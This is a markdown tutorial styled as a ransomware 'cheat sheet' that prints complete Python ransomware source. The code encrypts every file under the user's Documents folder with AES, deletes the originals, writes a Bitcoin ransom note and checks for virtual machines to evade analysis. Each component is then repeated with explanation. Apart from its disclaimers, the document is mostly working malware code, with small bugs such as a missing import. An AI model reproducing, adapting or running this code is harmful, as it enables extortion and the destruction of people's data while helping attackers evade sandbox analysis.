> ⚠️ **Disclaimer**: This code is for educational purposes only. Ransomware is highly illegal and unethical if deployed outside of a secure, isolated lab environment with proper authorization. Unauthorized deployment or use of ransomware is illegal and may lead to severe penalties.

# Ransomware Cheat Sheet (For Educational Purposes)

This cheat sheet provides a guide to a **Python-based Ransomware** script that encrypts files on a target machine, demonstrating the typical structure and techniques used in ransomware attacks.

---

## Ransomware Overview

A **Ransomware** attack typically involves:
- **File Encryption**: Encrypting files on the target machine to make them inaccessible.
- **Key Handling**: Securely generating and storing keys for encryption/decryption.
- **Persistence**: Ensuring continued execution until encryption is complete.
- **Ransom Note**: Informing the user of the encryption and instructions to decrypt.

---

## Key Features in This Ransomware

1. **Encryption of Targeted Files**: Encrypts files within a specified directory.
2. **Automatic Dependency Installation**: Installs required Python modules if missing.
3. **AES Encryption with Key Generation**: Generates an AES key for secure encryption.
4. **Ransom Note Generation**: Displays instructions for file recovery.
5. **Anti-Analysis Evasion**: Checks for sandbox environments.

---

## Advanced Python Ransomware Code

This code includes dependency checks, AES encryption using `pycryptodome`, selective file targeting, and ransom note creation.

### Full Ransomware Code

```python
import os
import sys
import ctypes
import base64
import tempfile
import subprocess
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

# Automatically check and install dependencies
def install_module(module_name):
    try:
        __import__(module_name)
    except ImportError:
        print(f"[*] Installing {module_name} module...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", module_name])

# Ensure required modules are installed
install_module("pycryptodome")
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

# Configuration
TARGET_DIR = os.path.expanduser("~/Documents")  # Replace with target directory path
ENCRYPTION_EXT = ".locked"
KEY_FILE = "encryption_key.key"

# Anti-sandboxing delay
time.sleep(10)

# Function to check for virtual environment
def is_virtual_environment():
    vmware_check = "VMware" in subprocess.getoutput("systeminfo")
    virtualbox_check = "VirtualBox" in subprocess.getoutput("systeminfo")
    return vmware_check or virtualbox_check

# Generate encryption key
def generate_key():
    key = get_random_bytes(16)
    with open(KEY_FILE, "wb") as f:
        f.write(key)
    return key

# Encrypt files in target directory
def encrypt_file(file_path, key):
    with open(file_path, "rb") as f:
        data = f.read()

    cipher = AES.new(key, AES.MODE_CBC)
    encrypted_data = cipher.encrypt(pad(data, AES.block_size))

    with open(file_path + ENCRYPTION_EXT, "wb") as f:
        f.write(cipher.iv + encrypted_data)

    os.remove(file_path)

# Decrypt files in target directory
def decrypt_file(file_path, key):
    with open(file_path, "rb") as f:
        iv = f.read(16)
        encrypted_data = f.read()

    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)

    original_path = file_path.replace(ENCRYPTION_EXT, "")
    with open(original_path, "wb") as f:
        f.write(decrypted_data)

    os.remove(file_path)

# Traverse target directory and encrypt files
def encrypt_files_in_directory(directory, key):
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            if not file.endswith(ENCRYPTION_EXT):  # Avoid re-encrypting files
                encrypt_file(file_path, key)

# Create ransom note
def create_ransom_note():
    note_path = os.path.join(TARGET_DIR, "README_FOR_DECRYPTION.txt")
    ransom_message = """
    Your files have been encrypted.
    To recover your files, please send 1 Bitcoin to the specified address.
    Once payment is received, you will receive instructions to decrypt your files.
    """
    with open(note_path, "w") as f:
        f.write(ransom_message)

# Main ransomware function
def ransomware():
    if is_virtual_environment():
        print("[!] Virtual environment detected. Exiting.")
        sys.exit(1)

    key = generate_key()
    encrypt_files_in_directory(TARGET_DIR, key)
    create_ransom_note()
    print("[*] Files have been encrypted and ransom note created.")

# Run ransomware
if __name__ == "__main__":
    ransomware()
```

---

## Explanation of Key Components

### 1. **Automatic Dependency Installation**

The `install_module()` function installs required dependencies if they are missing, using `pip`. Here, the `pycryptodome` library is necessary for AES encryption.

```python
def install_module(module_name):
    try:
        __import__(module_name)
    except ImportError:
        print(f"[*] Installing {module_name} module...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", module_name])
```

### 2. **AES Encryption and Key Generation**

The ransomware uses AES encryption with CBC mode. A random key is generated and saved to a file (`KEY_FILE`). This key will be needed to decrypt the files, making it a critical element in real-world ransomware attacks.

```python
def generate_key():
    key = get_random_bytes(16)
    with open(KEY_FILE, "wb") as f:
        f.write(key)
    return key
```

### 3. **File Encryption**

Each file is read and encrypted using AES in CBC mode. The encrypted data, along with the initialization vector (IV), is saved with a `.locked` extension. The original file is then deleted to avoid leaving unencrypted data.

```python
def encrypt_file(file_path, key):
    with open(file_path, "rb") as f:
        data = f.read()

    cipher = AES.new(key, AES.MODE_CBC)
    encrypted_data = cipher.encrypt(pad(data, AES.block_size))

    with open(file_path + ENCRYPTION_EXT, "wb") as f:
        f.write(cipher.iv + encrypted_data)

    os.remove(file_path)
```

### 4. **Target Directory Traversal**

The script encrypts files within the specified `TARGET_DIR` by traversing each file. Files are skipped if they already have the `.locked` extension to prevent re-encryption.

```python
def encrypt_files_in_directory(directory, key):
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            if not file.endswith(ENCRYPTION_EXT):
                encrypt_file(file_path, key)
```

### 5. **Ransom Note Creation**

A ransom note is created in the target directory with instructions on how to recover the files, including the ransom amount and a Bitcoin address.

```python
def create_ransom_note():
    note_path = os.path.join(TARGET_DIR, "README_FOR_DECRYPTION.txt")
    ransom_message = """
    Your files have been encrypted.
    To recover your files, please send 1 Bitcoin to the specified address.
    Once payment is received, you will receive instructions to decrypt your files.
    """
    with open(note_path, "w") as f:
        f.write(ransom_message)
```

### 6. **Anti-Analysis Evasion**

The script checks for sandbox environments by looking for common virtualization software indicators (e.g., VMware, VirtualBox). It exits immediately if a virtual environment is detected.

```python
def is_virtual_environment():
    vmware_check = "VMware" in subprocess.getoutput("systeminfo")
    virtualbox_check = "VirtualBox" in subprocess.getoutput("systeminfo")
    return vmware_check or virtualbox_check
```

---

## Security and Legal Disclaimer

This ransomware script is strictly for educational purposes and should only be used in a secure, isolated lab environment. Unauthorized deployment or use of ransomware is illegal and unethical.

```
